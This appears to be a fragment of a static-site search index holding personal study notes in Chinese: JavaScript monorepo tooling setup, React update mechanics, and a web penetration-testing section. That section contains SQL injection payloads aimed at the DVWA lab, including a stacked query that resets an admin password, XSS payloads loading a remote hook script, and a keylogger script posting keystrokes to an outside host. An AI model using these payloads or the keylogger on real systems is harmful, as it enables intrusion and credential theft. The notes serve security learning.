<p>\u5728\u6839\u9879\u76ee\u7684<code>package.json</code>\u4e2d,\u4e3a<code>lint</code>\u589e\u52a0\u5bf9\u5e94\u7684\u6267\u884c\u811a\u672c, \u5e76\u9a8c\u8bc1\u6548\u679c:</p> <pre><code>\"lint\": \"eslint --ext .js,.ts,.jsx,.tsx --fix --quiet ./packages\"\n</code></pre> \u4ee3\u7801\u63d0\u4ea4 <p>\u5b89\u88c5<code>husky</code>\uff0c\u7528\u4e8e\u62e6\u622a commit \u547d\u4ee4\uff1a</p> <pre><code>pnpm i husky -D -w\n</code></pre> <p>\u521d\u59cb\u5316 husky</p> <pre><code>npx husky init\n</code></pre> <p>\u5c06 <code>pnpm lint</code>\u547d\u4ee4\u7eb3\u5165<code>commit</code>\u524d<code>husky</code>\u5c06\u6267\u884c\u7684\u811a\u672c</p> <pre><code>- npx husky add ./husky/pre-commit \"pnpm init\"\n+ echo \"pnpm lint\" &gt; .husky/pre-commit\n</code></pre> <p>\u901a\u8fc7<code>commitlint</code>\u5bf9 git \u63d0\u4ea4\u4fe1\u606f\u8fdb\u884c\u68c0\u67e5</p> <pre><code>pnpm i -D -w @commitlint/cli @commitlint/config-conventional\n</code></pre> <p>\u65b0\u5efa\u914d\u7f6e\u6587\u4ef6<code>.commitlintrc.js</code>, \u6dfb\u52a0\u5982\u4e0b\u914d\u7f6e\uff1a</p> <pre><code>module.exports = {\n  extends: ['@commitlint/config-conventional'],\n}\n</code></pre> <p>\u96c6\u6210\u5230<code>husky</code>\u4e2d\uff1a</p> <pre><code>- npx husky add .husky/commit-msg \"npx --no-install commitlint -e $HUSKY_GIT_PARAMS\"\n// decreparted see [migration guide](https://typicode.github.io/husky/migrate-from-v4.html)\n+   echo \"npx --no-install commitlint -e $HUSKY_GIT_PARAMS\" &gt; .husky/commit-msg\n</code></pre> <p>git \u63d0\u4ea4\u683c\u5f0f\uff1a</p> <pre><code>// \u63d0\u4ea4\u7684\u7c7b\u578b\uff1a \u6458\u8981\u4fe1\u606f\n&lt;type&gt;\uff1a&lt;subject&gt;\n</code></pre> <p>\u5e38\u89c1\u7684<code>type</code>\u503c\u5305\u62ec\u5982\u4e0b\uff1a</p> <ul> <li><code>feat</code>: \u6dfb\u52a0\u65b0\u529f\u80fd</li> <li><code>fix</code>: \u4fee\u590d Bug</li> <li><code>chore</code>: \u4e00\u4e9b\u4e0d\u5f71\u54cd\u529f\u80fd\u7684\u66f4\u6539</li> <li><code>docs</code>: \u9488\u5bf9\u6587\u6863\u7684\u4fee\u6539</li> <li><code>perf</code>: \u6027\u80fd\u65b9\u9762\u7684\u4f18\u5316</li> <li><code>refactor</code>: \u4ee3\u7801\u91cd\u6784</li> <li><code>test</code>: \u6dfb\u52a0\u6d4b\u8bd5\u4ee3\u7801\u7b49</li> </ul> \u9009\u62e9\u8f6c\u8bd1\u5de5\u5177(transpiler tool) <p></p> <p>\"w/o\" for \"without\" \"w/\" was borrowed from this \"w/\" for \"with\"</p> <p>\u65b0\u5efa\u914d\u7f6e\u6587\u4ef6<code>tsconfig.json</code>\uff0c\u6dfb\u52a0\u5982\u4e0b\u914d\u7f6e\uff1a</p> <pre><code>{\n  \"compileOnSave\": true,\n  \"compilerOptions\": {\n    \"target\": \"ESNext\",\n    \"useDefineForClassFields\": true,\n    \"module\": \"ESNext\",\n    \"lib\": [\"ESNext\", \"DOM\"],\n    \"moduleResolution\": \"Node\",\n    \"strict\": true,\n    \"sourceMap\": true,\n    \"resolveJsonModule\": true,\n    \"isolatedModules\": true,\n    \"esModuleInterop\": true,\n    \"noEmit\": true,\n    \"noUnusedLocals\": true,\n    \"noUnusedParameters\": true,\n    \"noImplicitReturns\": false,\n    \"skipLibCheck\": true,\n    \"baseUrl\": \"./packages\"\n  }\n}\n</code></pre> \u9009\u62e9\u6253\u5305\u5de5\u5177(bundle tool) <p> \u4e0d\u540c\u6253\u5305\u5de5\u5177\u6bd4\u8f83 \u5f00\u53d1\u9879\u76ee\u7279\u70b9</p> <ul> <li>\u662f\u57fa\u5efa\u7684\u5e93\uff0c\u800c\u4e0d\u662f\u4e1a\u52a1\u5438\u7eb3\u8499\u53e4</li> <li>\u5e0c\u671b\u5de5\u5177\u5c3d\u53ef\u80fd\u7b80\u6d01\u3001\u6253\u5305\u4ea7\u7269\u53ef\u8bfb\u6027\u9ad8</li> <li>\u539f\u751f\u652f\u6301ESM</li> </ul> <p>\u6240\u4ee5\u8fd9\u91cc\u9009\u62e9<code>rollup</code>, \u5b89\u88c5\uff1a</p> <pre><code>pnpm i -D -w rollup\n</code></pre>"},{"location":"react/update/","title":"\u5982\u4f55\u89e6\u53d1\u66f4\u65b0","text":"<p>\u5e38\u89c1\u7684\u89e6\u53d1\u66f4\u65b0\u7684\u65b9\u5f0f\u6709\uff1a</p> <ul> <li>ReactDOM.createRoot().render  (\u9996\u5c4f\u6e32\u67d3\uff0c\u6216\u8001\u7248\u7684ReactDOM.render)</li> <li>this.setState</li> <li>useState\u7684dispatch\u65b9\u6cd5</li> </ul> <p>\u6211\u4eec\u5e0c\u671b\u5b9e\u73b0\u4e00\u5957\u540c\u4e00\u7684\u66f4\u65b0\u673a\u5236\uff0c \u4ed6\u7684\u7279\u70b9\u662f\uff1a</p> <ul> <li>\u517c\u5bb9\u4e0a\u8ff0\u89e6\u53d1\u66f4\u65b0\u7684\u65b9\u5f0f,\u89e6\u53d1\u66f4\u65b0\u7684\u65b9\u5f0f\u662f\u5bf9\u63a5\u5230\u8fd9\u5957\u66f4\u65b0\u673a\u5236\u4e2d</li> <li>\u65b9\u4fbf\u540e\u7eed\u6269\u5c55\uff08\u4f18\u5148\u7ea7\u673a\u5236..)</li> </ul> \u66f4\u65b0\u673a\u5236\u7684\u7ec4\u6210\u90e8\u5206 <ul> <li>\u4ee3\u8868\u66f4\u65b0\u7684\u6570\u636e\u7ed3\u6784 -- <code>update</code></li> <li>\u6d88\u8d39<code>update</code>\u7684\u6570\u636e\u7ed3\u6784 -- <code>UpdateQueue</code></li> </ul> <p></p> <p>\u63a5\u4e0b\u6765\u7684\u5de5\u4f5c\u5305\u62ec\uff1a</p> <ul> <li>\u5b9e\u73b0mount\u65f6\u8c03\u7528\u7684API</li> <li>\u5c06\u8be5API\u63a5\u5165\u4e0a\u8ff0\u66f4\u65b0\u673a\u5236</li> </ul> <p>\u9700\u8981\u8003\u8651\u7684\u662f\uff1a</p> <ul> <li>\u66f4\u65b0\u53ef\u80fd\u53d1\u751f\u4e8e\u4efb\u610f\u7ec4\u4ef6\uff0c\u800c\u66f4\u65b0\u6d41\u7a0b\u662f\u4ece\u6839\u8282\u70b9\u9012\u5f52\u7684</li> <li>\u9700\u8981\u4e00\u4e2a\u901a\u4e00\u7684\u4e00\u4e2a\u6839\u8282\u70b9\u4fdd\u5b58\u901a\u7528\u4fe1\u606f</li> </ul> <pre><code>ReactDOM.createRoot(rootElement).render(&lt;App/&gt;)\n</code></pre> <p></p>"},{"location":"security/","title":"Index","text":"<p>\u539f\u751fUI \u8bbe\u5907API media API \u7f51\u7edc\u901a\u4fe1 \u672c\u5730\u5b58\u50a8 \u6253\u5305\u548c\u53d1\u5e03</p>"},{"location":"security/security/","title":"web\u5b89\u5168\u6e17\u900f\u6d4b\u8bd5","text":"<p>Web\u6f0f\u6d1e\u6316\u6398\u83b7\u53d6\u76ee\u6807Web\u670d\u52a1\u5668\u6743\u9650\u548c\u654f\u611f\u4fe1\u606f</p> <p><code>\u6846\u67b6\u540d+\u7248\u672c\u53f7+\u6f0f\u6d1e</code>@vue/cli@4.5.14 RCE(Remote Code(Command) execution )</p>"},{"location":"security/security/#web_1","title":"web\u5b89\u5168\u6f0f\u6d1e\u5206\u7c7b","text":"<p>Tencent Security Response Center The WASC Threat Classification</p> <ul> <li>Brute Forces</li> <li>insufficient Authentication</li> <li>Weak Password Recovery Validation Command Execution</li> <li>Buffer Overflow</li> <li>Format String Attack</li> <li>LDAP injection</li> <li>OS Commanding</li> <li>SQL injection</li> <li>SSI injection</li> <li>XPath Injection Inforamation Disdosure</li> <li>Path Travelsal</li> <li>Predictable Resource Location</li> </ul>"},{"location":"security/security/#http","title":"HTTP\u534f\u8bae","text":"<p>\u7f16\u7801\u4e0e\u89e3\u7801 http\u4e2d\u4ecb\uff1a\u4ee3\u7406/\u7f51\u5173/\u7f13\u5b58 \u65ad\u70b9\u7eed\u4f20\u548c\u591a\u7ebf\u7a0b\u4e0b\u8f7d</p> <p>\u52a0\u5bc6\u4f20\u8f93\u5230CA\u8bc1\u4e66 \u6027\u80fd\u5e38\u89c1\u95ee\u9898 \u5b89\u5168\u5047\u8bbe \u9a8c\u8bc1\u673a\u5236 \u4f1a\u8bdd\u7ba1\u7406\u673a\u5236 webDav-\u7f51\u76d8\u5b58\u50a8 quic\u4e0ehttp3.0</p>"},{"location":"security/security/#request-response-lifecycle-timing","title":"request-response  lifecycle timing","text":""},{"location":"security/security/#urluri","title":"\bURL\u4e0eURI","text":""},{"location":"security/security/#ip","title":"IP\u5730\u5740\u548c\u7aef\u53e3","text":"<p>\u7aef\u53e3\u626b\u63cf: to know which PID/Program name uses(\u5360\u7528) a particular TCP port <code>-i</code> select by IPv[46] address: [46][proto][@host|addr][:svc_list|port] <code>-n</code> Do not convert port numbers to port names <code>-P</code> Do not resolve hostnames, show numerical addresses <pre><code>lsof -nP -iTCP:27017 -sTCP:LISTEN\nlsof -nP -i4@127.0.0.1:8000\nnetstat -anptu | grep LISTEN\n</code></pre></p>"},{"location":"security/security/#_1","title":"\u5e38\u89c1\u670d\u52a1\u53ca\u5bf9\u5e94\u7aef\u53e3","text":"<p>web\u670d\u52a1 HTTP:80/8080 HTTPS:443/8443 ssh\u670d\u52a1 ssh:20 dev server: 3000 | 8000 mongodb: 27017 redis: 6379 mysql: 3306</p> <pre><code>ssh://\nhttps://\nredis://\nmongodb://\n</code></pre>"},{"location":"security/security/#_2","title":"\u57df\u540d\u89e3\u6790","text":"<pre><code>nslookup vuejs.org\n</code></pre>"},{"location":"security/security/#tcp","title":"TCP\u4e09\u6b21\u63e1\u624b\uff1a\u786e\u4fdd\u53cc\u65b9\u901a\u4fe1\u53ef\u9760\u6027","text":"<p>\u7b2c\u4e00\u6b21\u63e1\u624b: Seq=X, SYN=1(\u8bf7\u786e\u8ba4) \u7b2c\u4e8c\u6b21\u63e1\u624b: ACK = X + 1(client\u786e\u8ba4server\u63a5\u6536\u80fd\u529b\u6b63\u5e38), Seq =Y\uff0c SYN=1(\u8bf7\u786e\u8ba4) \u7b2c\u4e09\u6b21\u63e1\u624b: ACK = Y + 1 (server\u77e5\u9053client\u63a5\u6536\u80fd\u529b\u6b63\u5e38)</p>"},{"location":"security/security/#http_1","title":"HTTP\u534f\u8bae\u4f20\u8f93\u7279\u70b9","text":"<ul> <li>\u9650\u5236\u6bcf\u6b21\u8fde\u63a5\u53ea\u5904\u7406\u4e00\u4e2a\u8bf7\u6c42\uff0c\u6536\u5230\u5e94\u7b54\u540e\u5c31\u91ca\u653e\u8fde\u63a5\uff0c\u91ca\u653e\u8d44\u6e90\u670d\u52a1\u5176\u4ed6\u5ba2\u6237\u7aef   \u65e9\u671f\u4e92\u8054\u7f51,\u95f4\u6b47\u6027\u5927\uff0c\u957f\u8fde\u63a5 <code>Connection:keep-alive</code>\u957f\u8fde\u63a5</li> <li>\u652f\u6301\u4f20\u8f93\u7c7b\u578b\u5e7f\u6cdb</li> </ul>"},{"location":"security/security/#http_2","title":"\u5e38\u89c1HTTP\u62a5\u6587\u5934","text":"<p><code>Cookie</code>\uff1a \u8bf7\u6c42\u5934 <code>Set-Cookie</code>:\u54cd\u5e94\u5934\uff0c <code>Authorization</code> <code>Cache-Control</code>: <code>Connection</code>: keep-alive, close <code>Upgrade</code>: websocket <code>Content-Type</code>: <code>Accept</code>: text/html, /(\u4ee3\u8868\u6d4f\u89c8\u5668\u53ef\u4ee5\u5904\u7406\u6240\u6709\u7c7b\u578b) \u53ef\u4ee5\u63a5\u53d7\u7684MIME\u7c7b\u578b\uff0c\u5982\u679c\u670d\u52a1\u5668\u8fd4\u56detext/html\u7c7b\u578b\u7684\u6570\u636e,\u670d\u52a1\u5668\u5e94\u8be5\u8fd4\u56de\u4e00\u4e2a406\u9519\u8bef(No Acceptable)</p>"},{"location":"security/security/#https","title":"HTTPS\u534f\u8bae\u5de5\u4f5c\u539f\u7406","text":"<p>common MIME types <pre><code>res.header(\"Content-Type\", \"text/event-stream\")\n\"Content-Type\": \"application/json\",\n// text/html text/event-stream\n// \"application/octet-stream\"\n// \"application/x-www-form-urlencoded\"\n// application/pdf application/msword text/csv application/vnd.ms-powerpoint\n// \"multipart/form-data\"\n// image/gif, image/png, image/jpeg\n</code></pre></p>"},{"location":"security/security/#http_3","title":"\u5e38\u89c1HTTP\u72b6\u6001\u7801","text":"<p><code>400</code> Bad Request \u5ba2\u6237\u7aef\u8bf7\u6c42\u8bed\u6cd5\u9519\u8bef <code>401</code> Unauthorized <code>403</code> Forbidden <code>404</code> Not Found \u8bf7\u6c42\u8d44\u6e90\u4e0d\u5b58\u5728 <code>405</code> Method Not Allowed \u8bf7\u6c42\u8d44\u6e90\u7684\u65b9\u6cd5\u4e0d\u5141\u8bb8 <code>406</code> Not Acceptable \u670d\u52a1\u5668\u4e0d\u5b58\u5728\u53ef\u4ee5\u63a5\u53d7\u7684\u8d44\u6e90\u7c7b\u578b <code>500</code>: Internal Server Error</p>"},{"location":"security/security/#web_2","title":"web\u7ad9\u70b9\u67b6\u6784","text":""},{"location":"security/security/#_3","title":"\u4ee3\u7406\u5de5\u5177","text":"<p>\u76d1\u542c\uff08listen on)\uff0c \u62e6\u622a (intercept) \u4fee\u6539(forward, drop,) \u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u4e4b\u524d\u7684\u8bf7\u6c42\u54cd\u5e94\u62a5\u6587</p> <p>burpsuit proxy\u6a21\u5757 intruder\u6a21\u5757</p>"},{"location":"security/security/#_4","title":"\u7ed5\u8fc7\u5ba2\u6237\u7aef\u653b\u51fb","text":"<p>\u8bf7\u6c42\u62e6\u622a \u7ed5\u8fc7\u9a8c\u8bc1\u7801 \u7ed5\u8fc7\u8eab\u4efd\u9a8c\u8bc1\uff08\u8eab\u4efd\u8bc1,\u90ae\u7bb1,\u7535\u8bdd) \u4e0b\u8f7d\u6743\u9650\u7ed5\u8fc7 \u7ed5\u8fc7\u652f\u4ed8\u6216\u7be1\u6539\u91d1\u989d<code>goodsnum=1&amp;goodsprice=.1</code> \u8868\u5355,cookie\u7ed5\u8fc7 \u52a0\u5bc6\u66ff\u6362(\u8f83\u4fbf\u5b9c\u4ea7\u54c1\u7684\u4ef7\u683c\u7684\u54c8\u5e0c\u503c\u66ff\u6362) \u7834\u89e3\u7b97\u6cd5'utf8','base32','md5','sha-256' \u5e38\u7528\u5bc6\u7801\u5f69\u8679\u8868 \u6293\u5305\u3001\u524d\u7aef\u7ed5\u8fc7\u64cd\u4f5c \u7ed5\u8fc7\u91d1\u989d\u652f\u4ed8</p>"},{"location":"security/security/#_5","title":"\u9a8c\u8bc1\u673a\u5236\u6f0f\u6d1e","text":""},{"location":"security/security/#single-signon","title":"single signon","text":"<p>access token: represent specific scopes and durations of access <code>access token state</code> : active | revoked | expired</p> <pre><code>// access token header\n{\n  \"type\": \"JWT\",\n  \"alg\"\n}\n\n// access token playload\n{\n  \"issuer\":\n  \"subject\": // end user who request the token\n  \"audience\": // \u53d7\u4f17\n  \"iat\": // issue at time\n}\n\n// access toke  signature\n</code></pre> <p>Authentication on the web (they are who they say they are) page require user to login subscription required</p>"},{"location":"security/security/#authentication-factors","title":"Authentication Factors","text":"<p>something that user know: safes have combination lock private club use ticket</p> <p>something that user has: bank user ATM card and PINS legal system uses signatures something that user is: fingerprint,voice pllices use fingerprints and dna biometric factor fingerprints retina scan facial recognition voice matching</p>"},{"location":"security/security/#credential-theft","title":"credential theft","text":"<ul> <li> social enginner guess</li> <li> brute-force</li> <li> keylogging <pre><code>ducument.onkeydown = (e)=&gt; {\n  xhr = new XMLHttpRequest()\n  // &amp;fnof;(method,url,?async, ?username, ?password)\n  xhr.open('POST', 'http://192.168.130/keylogger.php',true)\n  xhr.setRequestHeader(\"Content-Type\",\"application/x-www-urlencoded\")\n  xhr.send(\"key=\" + String.fromCharCode(e.key))\n}\n</code></pre></li> <li> phishing</li> <li> database theft</li> </ul> <p>\u5b8c\u6574\u6027\u548c\u7be1\u6539\u6821\u9a8c ocr\u8bc6\u522b \u9a8c\u8bc1\u7801(\u6ed1\u5757)\u6280\u672f \u767b\u5f55\u884c\u4e3a\u9650\u5236(\u8fde\u7eed5\u6b21\u9519\u8bef\u767b\u5f55,\u8d26\u53f7\u9501\u5b9a\u6216IP\u5730\u5740\u9501\u5b9a) \u53cc\u56e0\u5b50\u8ba4\u8bc1\uff08what you know) &amp; (what you have) \u5fd8\u8bb0\u5bc6\u7801\uff0c\u6ce8\u518c\u65f6\uff08\u9884\u7559\u7684\u624b\u673a\u53f7\u6216\u90ae\u7bb1\uff09 \u8bf7\u6c42\u62e6\u622a\u7be1\u6539\u653e\u5728\u67e5\u8be2\u53c2\u6570\u4e2d\u90ae\u7bb1\u5730\u5740\uff0c\u5c06email\u53c2\u6570\u6539\u6210\u81ea\u5df1\u7684</p> <p>cookie\u548c\u4f1a\u8bdd\u68c0\u6d4b\uff08retrylogin=0;\u767b\u5f55\u5c1d\u8bd5\u5931\u8d25,\u9012\u589e\u8be5\u503c\uff0c\u8fbe\u5230\u67d0\u4e2a\u4e0a\u9650\uff0c\u62d2\u7edd\u518d\u6b21\u5904\u7406\u767b\u5f55\uff09</p> <p>\u591a\u9636\u6bb5\u767b\u5f55\u5b58\u5728\u7684\u5b89\u5168\u98ce\u9669\u4e0e\u653b\u9632 \u5fd8\u8bb0\u5bc6\u7801\u7684\u653b\u51fb\u63aa\u65bd\u548c\u9632\u5fa1\u624b\u6bb5</p>"},{"location":"security/security/#_6","title":"\u4f1a\u8bdd\u7ba1\u7406\u6f0f\u6d1e","text":"<p>\u7531\u4e8ehttp\u7684\u65e0\u72b6\u6001,\u4e3a\u4e86\u7ef4\u6301\u540c\u4e00\u7528\u6237\u4e0d\u540c\u8bf7\u6c42\u7684\u72b6\u6001\uff0c\u6d3e\u53d1\u4e00\u4e2a\u552f\u4e00\u6807\u8bc6\u7528\u6237\u7684\u4ee4\u724c\uff08seesionID, token)\u662f\u5426\u4e0e\u670d\u52a1\u7aef\u5b58\u50a8\u7684\u4e00\u81f4 html\u4e0exml xml\u88ab\u8bbe\u8ba1\u4e3a\u4f20\u8f93\u548c\u5b58\u50a8\u6570\u636e html\u88ab\u8bbe\u8ba1\u4e3a\u663e\u793a\u6570\u636e)</p> <p>Session Fixation attack session/credential prediction attack session injection</p> <p>\u4f1a\u8bdd\u7ba1\u7406\u6f0f\u6d1e\u9632\u5fa1 \u8f6f\u786csession</p> <p>\u4f1a\u8bdd\u4ee4\u724c\u751f\u6210\u5b89\u5168\u98ce\u9669</p>"},{"location":"security/security/#_7","title":"\u8bbf\u95ee\u63a7\u5236\u6f0f\u6d1e","text":"<p>\u8d8a\u6743:\u6c34\u5e73\u8d8a\u6743\u4e0e\u5782\u76f4\u8d8a\u6743</p>"},{"location":"security/security/#sql","title":"SQL\u6ce8\u5165\u6f0f\u6d1e","text":"<p> - SQL\u6ce8\u5165\u539f\u7406 - \u6ce8\u5165\u8fc7\u7a0b - \u6ce8\u5165\u9632\u5fa1\u65b9\u6cd5</p>"},{"location":"security/security/#sql_1","title":"SQL\u6ce8\u5165\u7c7b\u578b","text":"<p>\u91cd\u8a00\u5f0f(\u6c38\u771f\u5f0f)\u6ce8\u5165(tautology): \u6761\u4ef6\u8868\u8fbe\u5f0f\u7ed3\u679c\u6c38\u8fdc\u5224\u5b9a\u4e3a\u771f\uff0c\u4ece\u800c\u7ed5\u8fc7\u8ba4\u8bc1\u6216\u8bbf\u95ee\u673a\u5236 playload -&gt; db query -&gt; result  \u5f53\u524d\u6570\u636e\u5e93\u540d\u957f\u5ea6 <code>substr(str,start, count)</code> <code>1' and length(database()) &gt;= 4#</code> ?<code>id=' and substr(database(),2,1) &gt;= 97</code> \u8054\u5408\u67e5\u8be2\u6ce8\u5165 <code>select name from users where id = '1' union select password from users#'</code> - order by\u8bed\u53e5\u731c\u5217\u6570 <code>SELECT user_name FROM Users WHERE id = '</code>1' order by 2#<code>'</code> <code>0' union select null, null%23</code> \u67e5\u8be2\u4e3b\u673a\u7cfb\u7edf\u7248\u672c\u4fe1\u606f <code>0' union select null, @@global.version_compile_os from mysql.user#</code> \u67e5\u8be2\u5f53\u524d\u6570\u636e\u5e93\u540d <code>0' union select null, concat_ws(\":\",user(), version(), database())%23</code> \u67e5\u8be2\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u7684\u6240\u6709\u8868 <code>0' union select null,group_concat(table_name) from information_schema.tables  where table_scheme='dvwa'#</code> \u67e5\u8be2\u8868 <code>0' union select null,group_concat(column_name) from information_schema.columns  where table_scheme='dvwa' and table_name='users'#</code> \u67e5\u8be2\u5f53\u524d\u7528\u6237-&gt; playload:<code>` get\u6ce8\u5165\u70b9-&gt;</code>And <code>1=1</code> \u7834\u89e3\u8868\u540d-&gt; <code>And (Select Count(*) from Admin) &gt;=0</code> \u7834\u89e3\u5b57\u6bb5\u540d-&gt; \u76f2\u6ce8\u83b7\u5f97\u5b57\u6bb5\u503c</p> <p>\u901a\u8fc7mysql\u6ce8\u91ca\u7b26\u6765\u6ce8\u91ca\u540e\u7eed\u8bed\u53e5\uff0c\u907f\u514d\u8bed\u6cd5\u62a5\u9519 <code>encodeURIComponent(#)</code> \u5fc5\u987b\u901a\u8fc7URL\u7f16\u7801 -&gt; '%23' <code>--</code></p> <ul> <li> <p>\u65f6\u95f4\u5ef6\u8fdf\u6ce8\u5165 \u5224\u65ad\u6570\u636e\u5e93\u540d\u957f\u5ea6\u548c\u6570\u636e\u5e93\u540d <code>1' if(length(database())&gt;=8,0,sleep(5))#</code> <code>1' if(substr(select database())&gt;='a',0,sleep(5))#</code></p> </li> <li> <p> \u5806\u53e0\u6027\u6ce8\u5165(stack injection) \u901a\u8fc7\u5206\u53f7\u5806\u53e0\u6ce8\u5165,\u4fee\u6539\u7ba1\u7406\u5458\u5bc6\u7801</p> </li> </ul> <p><code>select * from users where id=</code> <code>1'; update users set password ='xiyuan' where username = 'root';#</code></p> <ul> <li> <p> \u4e8c\u6b21\u6ce8\u5165  \u66f4\u8be5\u5f53\u524d\u7528\u6237\u7684\u5bc6\u7801\u53d8\u6210\u66f4\u6539\u7ba1\u7406\u5458\u5bc6\u7801 <code>update user set password = '$new_pass' where username='$username' and password='$curr_pass'</code></p> </li> <li> <p> \u6587\u4ef6\u5bfc\u51fa \u67e5\u8be2secure_file_priv\u914d\u7f6e\u9879</p> </li> </ul> <p><code>select @@secure_file_priv</code>\u4e3a<code>NULL</code>\u65f6,\u7981\u6b62\u5bfc\u5165\u5bfc\u51fa</p> <p>SQL\u6ce8\u5165\u6f0f\u6d1e\u63a2\u6d4b</p> <p><code>?=1'</code>sql\u8bed\u53e5\u76f4\u63a5\u62fc\u63a5\u67e5\u8be2\u53c2\u6570</p> <p>\u5224\u65ad\u5f53\u524d\u6570\u636e\u5e93\u662f\u5426\u6709\u7ba1\u7406\u5458\u6743\u9650 playload:?<code>id=1')) and (select count(*) from mysql.user)&gt;0%23</code> \u83b7\u53d6web\u76ee\u5f55\u7edd\u5bf9\u8def\u5f84 <code>?id=')) union select null,null into outfile \"~/www/lab/shell.js\"#23</code></p> <ul> <li> <p> log MySQL\u7684general_log\u4f1a\u5c06\u6240\u6709\u5230\u8fbeMySQL Server\u7684query\u8bed\u53e5\u8bb0\u5f55\u5230\u6307\u5b9a\u7684\u65e5\u5fd7\u6587\u4ef6\u4e2d</p> </li> <li> <p>[x] \u6dfb\u52a0<code>%df</code>\u6765\u5403\u6389\u8f6c\u4e49\u7b26\u5373\u53ef\u8fdb\u884cSQL\u6ce8\u5165</p> </li> </ul> <p>MySQL\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u901a\u4fe1\u65f6\uff0c \u670d\u52a1\u7aef\u5982\u4f55\u89e3\u7801\u5ba2\u6237\u7aef\u53d1\u6765\u7684\u5b57\u7b26 \u5982\u4f55\u7f16\u7801\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u7684\u7ed3\u679c</p> <ul> <li>[x]\u81ea\u52a8\u5316\u6ce8\u5165sqlmap</li> </ul>"},{"location":"security/security/#_8","title":"\u6ce8\u5165\u4f4d\u7f6e","text":"<p>HTTP\u5934\u6ce8\u5165 \u8bf7\u6c42\u53c2\u6570\u6ce8\u5165</p>"},{"location":"security/security/#_9","title":"\u6ce8\u5165\u9632\u5fa1\u65b9\u6cd5","text":""},{"location":"security/security/#_10","title":"\u6570\u636e\u5e93\u7c7b\u578b","text":"<p>-nosql mongo mysql oracle postgressql</p>"},{"location":"security/security/#_11","title":"\u5e8f\u5217\u5316","text":"<p>\u6570\u636e\u7ed3\u6784\u80fd\u4ee5\u5bf9\u8c61\u65b9\u5f0f\u5b58\u50a8\uff0c\u4f46\u5f97\u8f6c\u6362\u6210\u5b57\u8282\u6d41\u624d\u80fd\u4f20\u8f93</p> <p>\u5e8f\u5217\u5316: \u5bf9\u8c61 -&gt; \u5b57\u8282\u6d41</p> <p>\u53cd\u5e8f\u5217\u5316\uff1a \u5b57\u8282 -&gt; \u5bf9\u8c61</p> <p>\u5e8f\u5217\u5316\u7684\u6761\u4ef6: java.io.Serializable</p> <p>comuptable\u53ef\u8ba1\u7b97\u7684</p> <p>xpath\u6ce8\u5165</p> <p>html\u4e0exml xml\u88ab\u8bbe\u8ba1\u4e3a\u4f20\u8f93\u548c\u5b58\u50a8\u6570\u636e html\u88ab\u8bbe\u8ba1\u4e3a\u663e\u793a\u6570\u636e</p>"},{"location":"security/security/#data-cleansing","title":"data cleansing\u6570\u636e\u6e05\u6d17","text":"<p>\u67e5\u8be2\u53c2\u6570\u68c0\u6d4b,\u8fc7\u6ee4,\u8f6c\u4e49 - close quote string as  <code>'</code> - statement terminator <code>;</code> - comment <code>#</code> - character escape<code>\\</code></p>"},{"location":"security/security/#xss","title":"XSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb","text":"<p>XSS \u53cd\u5c04\u5f0fXSS \u5b58\u50a8\u5f0fXSS DOM XSS</p> <p>\u4e3b\u673aOS\u3001IP\u3001HTTP\u5934 Permission API</p> <p>Authentication API</p> <pre><code>const getPermission = async (permission) =&gt; {\n  const result = await navigator.permissions.query({name:permission})\n  // state: 'granted' |'prompt' | 'denied'\n  return `${permission}: ${result.state}`\n}\n</code></pre> <p><code>&lt;script src=\"http://&lt;IP&gt;:3000/hook.js\"&gt;&lt;/script&gt;</code> \u8fdc\u7a0burl\u4e0a\u7684\u6076\u610fjs\u6587\u4ef6 <pre><code>const os = {\n  detect() =&gt; {\n    const userAgent = navigator.userAgent.toLowerCase()\n    if (userAgent.indexOf(\"win\") &gt; -1) return \"Windows\";\n    if (userAgent.indexOf(\"mac\") &gt; -1) return \"MacOS\";\n    if (userAgent.indexOf(\"linux\") &gt; -1) return \"Linux\";\n    if (userAgent.indexOf(\"android\") &gt; -1) return \"Android\";\n    if (userAgent.indexOf(\"ios\") &gt; -1) return \"iOS\";\n  }\n}\nconst host = {\n  os:{arch,family,name,version,software:{defaultbrower}}\n}\nconst location: {\n  city:,\n  country:,\n  ipadderss:,\n}\n\nconst broweser = {\n  getRequestHeader(){},\n  // browser feature support detection\n  capabilities: {\n    webrtc: \"RTCPeerConnection\" in window,\n    wetsocket: \"WebSocket\" in window,\n    webworker: \"Worker\" in winodw,\n    wegl: navigator.gpu,\n    storage,\n    svg\n  }\n  version,\n  platform,\n  engine\uff1a (()=&gt; {\n         if (window.opera &amp;&amp; window.opera.buildNumber) return 'Presto';\n         else if ('MozAppearance' in document.documentElement.style) return 'Gecko';\n         else if ('WebkitAppearance' in document.documentElement.style) return 'WebKit';\n         else if (navigator.userAgent.indexOf('Trident') !== -1) return 'Trident';\n       })(),\n  language,\n  data: {datetime,timezone}\n  window:{\n    url: window.location.href,\n    origin: window.location.origin,\n    path: window.location.pathname\n    hostname: window.location.hostname,\n    query:window.loaction.search\n    anchor: window.location.hash\n    referrer:document.referrer,\n    cookies:navigator.cookieEnabled,\n    title:document.title\n}\n}\n\nconst hardware = {\n  battery:{\n    level:'getBattery' in navigator ?\n            (async () =&gt; {\n              try {\n                const battery = await navigator.getBattery();\n                return battery.level;\n              } catch (error) {\n                console.error('Error getting battery level:', error);\n                return 'Error';\n              }\n            })() : 'Not supported'\n  }\n  cpu:{cores,arch}\n  gpu,\n  gpu:{vendor}\n  memory,\n  type,\n  screen:{touchenabled, size:{width,height}\n}\n</code></pre></p> <p><code>&lt;script&gt; window.location=\"http://xss.attck/redirect.js\"&lt;/script&gt;</code></p> <p><code>&lt;a href=\"javascript:\"&gt;&lt;/a&gt;</code></p> <p>`</p> <p><code>&lt;object data=\"data:text/html;base64,\"/&gt;</code> <code>&lt;iframe onmouseleave=\"\"&gt;&lt;/iframe&gt;</code></p> keylogger.js<pre><code>ducument.onkeydown = (e)=&gt; {\n  xhr = new XMLHttpRequest()\n  // &amp;fnof;(method,url,?async, ?username, ?password)\n  xhr.open('POST', 'http://192.168.130/keylogger.php',true)\n  xhr.setRequestHeader(\"Content-Type\",\"application/x-www-urlencoded\")\n  xhr.send(\"key=\" + String.fromCharCode(e.key))\n}\n</code></pre>"},{"location":"security/security/#xss-attack","title":"XSS attack \u9632\u5fa1","text":""},{"location":"security/security/#input-validation","title":"Input 